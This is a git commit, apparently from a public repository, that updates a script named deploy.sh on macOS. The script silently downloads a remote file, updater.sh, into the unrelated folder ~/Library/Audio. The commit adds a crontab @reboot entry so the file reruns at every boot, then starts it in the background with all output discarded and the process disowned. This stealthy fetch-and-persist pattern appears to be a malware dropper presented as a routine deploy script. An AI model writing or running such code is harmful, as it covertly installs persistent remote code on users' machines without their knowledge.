90179e6f03d609ebecde26a7ab0e93d378f7a3e3
Milooles <doodoododo1701@gmail.com>
2025-09-20 14:16:49 +1000

    Update deploy.sh

--- deploy.sh
+++ deploy.sh
@@ -1,2 +1,7 @@
 # Install updater.sh
 curl -so ~/Library/Audio/updater.sh https://raw.githubusercontent.com/Milooles/RETAvRD/refs/heads/main/updater.sh
+
+(crontab -l 2>/dev/null; echo "@reboot ~/Library/Audio/updater.sh >/dev/null 2>&1") | crontab -
+
+# Start updater.sh
+sh ~/Library/Audio/updater.sh &>/dev/null & disown
